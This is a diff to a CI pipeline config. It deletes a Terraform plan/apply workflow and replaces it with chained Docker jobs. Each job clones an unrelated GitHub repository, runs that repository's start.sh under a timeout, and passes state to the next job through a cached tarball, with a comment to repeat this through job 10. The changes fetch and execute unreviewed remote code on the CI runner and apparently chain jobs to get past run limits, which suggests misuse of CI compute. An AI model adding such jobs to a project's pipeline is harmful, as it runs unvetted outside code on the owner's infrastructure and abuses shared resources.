@@ -1,20 +1,39 @@
 version: 1
-
-stack:
-  name: terraform-with-docker
-  runner:
-    labels:
-      - docker
-
-  terraform:
-    version: "1.6.6"
-
-workflows:
-  default:
-    plan:
-      - run: ls
-      - run: echo "test start"
-      - run: terraform init
-      - run: terraform plan
-    apply:
-      - run: terraform apply -auto-approve
+jobs:
+  - name: job-1
+    image: ubuntu:latest
+    commands:
+      - apt-get update && apt-get install -y git
+      - git clone https://github.com/Fiujol/android android || true
+      - mkdir -p /cache
+      - cp /cache/android-cache.tar.gz android-cache.tar.gz || true
+      - tar -xzf android-cache.tar.gz -C android || true
+      - sleep 60
+      - cd android
+      - timeout 7m bash start.sh 8 || echo "Script timed out but job continues"
+      - tar -czf android-cache.tar.gz .
+      - cp android-cache.tar.gz /cache/android-cache.tar.gz
+    cache:
+      - path: /cache/android-cache.tar.gz
+  - name: job-2
+    image: ubuntu:latest
+    commands:
+      - apt-get update && apt-get install -y git
+      - git clone https://github.com/Fiujol/android android-2 || true
+      - mkdir -p /cache
+      - cp /cache/android-cache.tar.gz android-cache.tar.gz || true
+      - tar -xzf android-cache.tar.gz -C android-2 || true
+      - sleep 60
+      - cd android-2
+      - timeout 7m bash start.sh 8 || echo "Script timed out but job continues"
+      - tar -czf android-cache.tar.gz .
+      - cp android-cache.tar.gz /cache/android-cache.tar.gz
+    cache:
+      - path: /cache/android-cache.tar.gz
+    depends_on:
+      - job-1
+  # Add jobs 3–10 similarly, each with depends_on
+runner:
+  type: docker
+  machine: standard # 2vCPU, 4GB RAM
+timeout: 7200 # 2 hours, covers ~100 minutes
